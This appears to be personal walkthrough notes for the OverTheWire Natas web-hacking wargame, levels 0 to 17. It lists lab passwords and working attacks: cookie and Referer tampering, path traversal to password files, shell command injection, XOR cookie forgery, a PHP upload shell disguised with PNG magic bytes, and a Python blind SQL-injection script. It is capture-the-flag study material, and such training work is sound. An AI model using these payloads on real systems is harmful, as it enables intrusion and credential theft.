lvl 0:
-----------
http://natas0.natas.labs.overthewire.org/
natas0 : natas0


lvl 1:
-----------
ctrl + U 
<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->



lvl 2:
-----------
ctrl + U
<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->


lvl 3:
-----------
ctrl + U
->
http://natas2.natas.labs.overthewire.org/
->
<img src="files/pixel.png">
->
http://natas2.natas.labs.overthewire.org/files
->
http://natas2.natas.labs.overthewire.org/files/users.txt
->
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
->
G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q


lvl 4:
-----------
http://natas3.natas.labs.overthewire.org/robots.txt
->
User-agent: *
Disallow: /s3cr3t/
->
http://natas3.natas.labs.overthewire.org/s3cr3t/
->
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
->
natas4 : tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm



lvl 5:
-----------
open burp
->
change refered in request from
->
Referer: http://natas4.natas.labs.overthewire.org/
->
to
->
Referer: http://natas5.natas.labs.overthewire.org/
->
Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD 


lvl 6:
-----------
open burp
->
Cookie: loggedin=0
->
Cookie: loggedin=1
->
 Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR



lvl 7:
-----------
click View sourcecode
->

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

->
include "includes/secret.inc";
->
http://natas6.natas.labs.overthewire.org/includes/secret.inc
->
ctrl + U
->
<?
  $secret = "FOEIUWGHFEEUHOFUOIU";
?>

->
enter in input secret 
->
Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr 




lvl 8:
-----------
click home / about
->
http://natas7.natas.labs.overthewire.org/index.php?page=home
->
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
->
/etc/natas_webpass/natas8
->
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
->
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 




lvl 9:
-----------

->
click View sourcecode
->

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

->
encoded_secret = "3d3d516343746d4d6d6c315669563362"

# Reverse process:
# Step 1: Convert hex to binary
binary_secret = bytes.fromhex(encoded_secret)

# Step 2: Reverse the binary string
reversed_binary_secret = binary_secret[::-1]

# Step 3: Decode the base64 encoded string
original_secret = reversed_binary_secret.decode('base64')

original_secret
->
Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd





lvl 10:
-----------
->
; cat /etc/natas_webpass/natas10 &&
->
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
->





lvl 11:
-----------
->
view source code
->
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}

->
https://security.stackexchange.com/questions/204213/can-i-inject-a-shell-command-here-in-php
->
POC :
line feed    ls    #
%0a          ls    #
%0Als#
?needle=%0Als#&submit=Search
->
?needle=%0Acat /etc/natas_webpass/natas11%0A#&submit=Search
->
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg





lvl 12:
-----------
Cookies are protected with XOR encryption
->
enter burp + refresh
->
Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
%3D in URL Encoding is = meaning data is a base64 string
decodign it reveals bulshit meaning it as sayd by the challenge is encrypted somehow with XOR

what else we see
Background color: #ffffff
->
open the source code
understand the code flow well
please review the natas11.png before continuing
->
now that we understand the code/encryption flow well
we now know what we have to do to reverse the encryption.

since we have the original data ($defaultdata) & the result of the XOR ($data in COOKIE)
all we have to do is reverse the XOR the reveal the original encryption key. lets do so by reversing the xor_encrypt()

--------------------------------------------------------------
<?php
function xor_decrypt() {
    //$key = '<censored>';  // B
    //$text = $in;          // A
    //$outText = '';        // C
    
    // $outText --> $key (B)
    $b = '';
    
    // $text --> base64_decode($data) (C)
    $data = base64_decode('HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=');
    $c = $data;
    
    // $text --> (A)
    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
    $a = json_encode($defaultdata);

    
    // Iterate through each character
    for($i=0;$i<strlen($c);$i++) {
    $b .= $c[$i] ^ $a[$i % strlen($a)];
    }

    return $b;
}

echo xor_decrypt();
?>
--------------------------------------------------------------
output is 'eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe' but the real answer is 'eDWo'

im not some encryption expert but from verifying my answeres on some walkthroughs such as john hammonds and JosÃ© Slon medium article
this issue occurs when the $key is smaller in length from the plaintext secret by some binary XOR Math miracle.

this is why this part "$i % strlen($key)" is so relevant in this line of code in xor_encrypt()
""" $outText .= $text[$i] ^ $key[$i % strlen($key)]; """
this is because we are looping over the binary value of $key over and over again (as the value is low)

->
so whats left is to craft our own cookie which will reveal the password and replace current
cookie to force the natas12 password thus we will need:

# first set the $key in place instead of "<censored>"
function xor_encrypt($in) {
    $key = 'eDWo';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

# secondly we will have to craft the cookie so
  lets take the code from saveData() and change it abit

  // note that we changed showpassword
  $d = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
  echo base64_encode(xor_encrypt(json_encode($d))); 

change the data using burp or cookie editor, save, reload the page and viol`a 
The password for natas12 is XXXXXXXX

like that didnt take a long time :D





lvl 13:
-----------
# this is a file upload page which allows to upload JPEG with max size of 1 KB
# first step, read the source code and understand it good.

# code breakdown
                                    
# make a string representing path of the uploaded file which looks like this:
  "uploades/" + ranom 10 characters + "." + uploaded_filename_extention
# the string i mentioned is dependent of the post variables
# 3 fucntions which are used to create the path string
  # genRandomString() --> gets a random 10 character string
  # makeRandomPath()  --> creates a path string using 
                          1. "upload" + "/"
                          2. random 10 string character from genRandomString()
                          3. "." + given ext which was given from makeRandomPathFromFilename()
  # makeRandomPathFromFilename() --> extracts the file extention without the dot & returns the 
                                     result of makeRandomPath() using the extention and uploaded filename


after reviewing the code i made some tests. first test is uploading a file named aha.test.
reviewing the code i was confused as the output should look like this:
The file <a href=upload/XXXXXXXXX.test> upload/XXXXXXXXX.test </a> has been uploaded

but instead it enforced the file extention to jpeg, as such:
The file <a href=upload/XXXXXXXXX.jpeg> upload/XXXXXXXXX.jpeg </a> has been uploaded

which is an issue because ill need it to be php extention inorder for me to extract the next flag.
to fix this issue ill need to dive into the post request and how uploading files works in HTTP requests.


first thing i noticed is a new header to me which are the Content-Type header "boundry value" & Content-Disposition header.
After reading this documentation i have understood multiple key factorts.
https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition

file upload post request breakdown (i left only what is important for the challenge):


POST /index.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----geckoformboundary484cd26158fb8e96ad0a9ab7285236aa


------geckoformboundary484cd26158fb8e96ad0a9ab7285236aa
Content-Disposition: form-data; name="MAX_FILE_SIZE"
1000
------geckoformboundary484cd26158fb8e96ad0a9ab7285236aa
Content-Disposition: form-data; name="filename"
nvm985xze2.jpg
------geckoformboundary484cd26158fb8e96ad0a9ab7285236aa
Content-Disposition: form-data; name="uploadedfile"; filename="aha.test"
Content-Type: application/octet-stream

eye test 1 2 1 2
------geckoformboundarya350e529c3e67ca318234164fe44539b




# Content-Type --> multipart/form-data
excalims that this file is sent in multiple parts

# boundary between each part is "----geckoformboundary484cd26158fb8e96ad0a9ab7285236aa"

# first  "Content-Disposition" shows the MAX_FILE_SIZE which is 1 kb
# second "Content-Disposition" sends a hidden file parameter set in the form input tags 
# third  "Content-Disposition" sends the actual content and filename of the uploaded file

# boundary to represent the end of the file multiparts


this explains why the jpeg extention was enforced although the code logig showed otherwise.
to fix / win this challenge all we need to do is to edit the post request such that:
1. change the hidden file name extention to have .php instead of .jpeg
2. edit the file content to print out the flag (since a rev shell is too far fetched for this task)


------geckoformboundarya350e529c3e67ca318234164fe44539b
Content-Disposition: form-data; name="MAX_FILE_SIZE"
1000
------geckoformboundarya350e529c3e67ca318234164fe44539b
Content-Disposition: form-data; name="filename"
nvm985xze2.php
------geckoformboundarya350e529c3e67ca318234164fe44539b
Content-Disposition: form-data; name="uploadedfile"; filename="aha.test"
Content-Type: application/octet-stream

<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>
------geckoformboundarya350e529c3e67ca318234164fe44539b






lvl 14:
-----------
This is the same task as lvl 13, but this type were fucked by a new security measure which enforces file 
type validation by verifying the magic bytes using the exif_imagetype() function on the uploaded file :

    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";

now to bypass this all we have to do is to push the magic bytes of an image file type unto our previous php
file code which is currently only ASCII text file.

> file aha.test && cat aha.test
aha.test: PHP script, ASCII text
<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>

> xxd aha.test
00000000: 3c3f 7068 7020 6563 686f 2066 696c 655f  <?php echo file_
00000010: 6765 745f 636f 6e74 656e 7473 2822 2f65  get_contents("/e
00000020: 7463 2f6e 6174 6173 5f77 6562 7061 7373  tc/natas_webpass
00000030: 2f6e 6174 6173 3133 2229 3b20 3f3e 0a    /natas13"); ?>.


now i could use a hex editor which is the most easy way but i dont want to install it on my kali so ill use python instead.

> python -c 'with open("aha.test", "wb") as file: file.write(bytes.fromhex("89504E47") + "<?php echo file_get_contents(\"/etc/natas_webpass/natas13)\"); ?>".encode())'                                                                                                                                                       

> xxd aha.test
00000000: 8950 4e47 3c3f 7068 7020 6563 686f 2066  .PNG<?php echo f
00000010: 696c 655f 6765 745f 636f 6e74 656e 7473  ile_get_contents
00000020: 2822 2f65 7463 2f6e 6174 6173 5f77 6562  ("/etc/natas_web
00000030: 7061 7373 2f6e 6174 6173 3133 2922 293b  pass/natas13)");
00000040: 203f 3e                                   ?>
                   



lvl 15:
-----------
->
view source code
->
ez boolean based sqli
->
" or 1=1;#
->
TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB





lvl 16:
-----------
started with or like injecting to
find user name min & max lenghs

" or (username like '_');# ==> user doesn't exist
" or (username like '__');# ==> user doesn't exist
" or (username like '___');# ==> user does exist !!!!
" or (username like '____');# ==> user doesn't exist
" or (username like '_____');# ==> user does exist
....
7 letters exists
....
users with 3, 5 & 7 letters exist
->
created a script that using another sqli
and subquery i guess each and each character
of existing rows in database
->
the script found 3 users:
bob (3)
alice (5)
charlie (7)
->
import requests

url = "http://natas15.natas.labs.overthewire.org/index.php"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://natas15.natas.labs.overthewire.org",
    "DNT": "1",
    "Authorization": "Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==",
    "Connection": "close",
    "Referer": "http://natas15.natas.labs.overthewire.org/",
    "Upgrade-Insecure-Requests": "1",
}
body = {
    "username": None # payload goes here
}

lower_charset = "abcdefghijklmnopqrstuvwxyz"
upper_charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
numbers_charset = "0123456789"
#special_charset = "`~!@#$%^&*()-_=+[{]}\\|;:'\",<.>/?"
all_charset = lower_charset + upper_charset + numbers_charset

error_msg = ("This user doesn't exist", "Error in query")
success_msg = "This user exists."

                  
def record_length_enum(column="", length=-1):
    length_found = []

    if (column == "" or length == -1):
        return
    
    for num in range(length):
        if num == 0: continue

        # payload request
        body["username"] = f"\"or ({column} like \'{'_' * num}');#"
        print(body["username"])
        response = requests.post(url, headers=headers, data=body).text
        print(response)

        if (success_msg in response):
            length_found.append(num)

    return length_found

def record_enum(column="", lengths=[]):
    if (column == "" and lengths == []): 
        print("didnt supply column & record lengths list")
        return

    cracked = [''] * len(lengths) # new list with default value times len of existing list
    position = 1 # substring length
    isStartedCharSet = False
    for curr_cracked in range(len(cracked)): # for every record being cracked
        while (len(cracked[curr_cracked]) < lengths[curr_cracked]): # until we didnt finish cracking curr record
            for curr_char in all_charset: # try every char in all of the charsets                
                # payload request
                body["username"] = f"natas16\" and (substring({column}, 1, {position}) like binary '{cracked[curr_cracked] + curr_char}%');#"
                print(body["username"])
                response = requests.post(url, headers=headers, data=body).text
                print(response)
                
                if (success_msg in response):
                    cracked[curr_cracked] += curr_char
                    isStartedCharSet = False # if we get a success we didnt finish cracking yet
                    break # we found a charcter now move to next position (/next character)

                # infinite (character) loop break
                if (not isStartedCharSet):
                    isStartedCharSet = True
                    last_charset_letter = all_charset[len(all_charset)-1]
                # meaninig we started looping and restarted charset 
                elif (curr_char == last_charset_letter and isStartedCharSet): 
                    cracked[curr_cracked] = ''
                    return cracked
            position += 1
        
        position = 1 #after 1 successfull crack
    return cracked


# ------------------------------------------------
# part 1 - blind sqli to find rows lenth
# ------------------------------------------------

# username_records_lengths = (record_length_enum("username", 50))
# password_records_lengths  = (record_length_enum("password", 50))

# print(f"found (username) rows: {len(username_records_lengths)}")
# [print(f"row {row_num + 1}, record length {username_records_lengths[row_num]}") 
# for row_num in range((len(username_records_lengths)))]

# print(f"\nfound (password) rows: {len(password_records_lengths)}")
# [print(f"row {row_num + 1}, record length {password_records_lengths[row_num]}") 
# for row_num in range((len(password_records_lengths)))]


# ------------------------------------------------
# part 2 - blind sqli to crack rows (letter by letter)
# ------------------------------------------------
#print(record_enum("username", [3, 5, 7]))
print(record_enum("password", [10, 32]))


# ------------------------------------------------
# part 3 - reconfigure payload
# ------------------------------------------------

# original payload
#body["username"] = f"\"or (substring({column}, 1, {position}) = '{cracked[curr_cracked] + curr_char}');#"


# like binary is case sensetive since it compares the binary
#body["username"] = f"\" and (substring({column}, 1, {position}) like binary '{cracked[curr_cracked] + curr_char}%');#"


# to filter only natas16 password
#body["username"] = f"natas16\" and (substring({column}, 1, {position}) like binary '{cracked[curr_cracked] + curr_char}%');#"
            
# natas16 : TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V






lvl 17:
-----------
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}

http://natas16.natas.labs.overthewire.org/?needle=bitch&submit=Search

bitch
bitch's
bitched
bitches
bitching



# https://bugs.php.net/bug.php?id=69274
http://natas16.natas.labs.overthewire.org/?needle[.]='ls'&submit=Search

Warning:  preg_match() expects parameter 2 to be string, array given in /var/www/natas/natas16/index.php on line 31


failes:
http://natas16.natas.labs.overthewire.org/?needle=%0a'ls'&submit=Search
http://natas16.natas.labs.overthewire.org/?needle[.]='ls'&submit=Search
http://natas16.natas.labs.overthewire.org/?needle[0]='ls'&submit=Search
http://natas16.natas.labs.overthewire.org/?needle[0]=`ls`&submit=Search
http://natas16.natas.labs.overthewire.org/?needle=test[0]&test[0]='ls'&submit=Search






lvl 18:
-----------



lvl 19:
-----------


lvl 20:
-----------

lvl 21:
-----------

lvl 22:
-----------
lvl 23:
-----------
lvl 24:
-----------
lvl 25:
-----------
lvl 26:
-----------
lvl 27:
-----------
lvl 28:
-----------
lvl 29:
-----------
lvl 30:
-----------
lvl 31:
-----------
lvl 32:
-----------
lvl 33:
-----------
lvl 34:
-----------
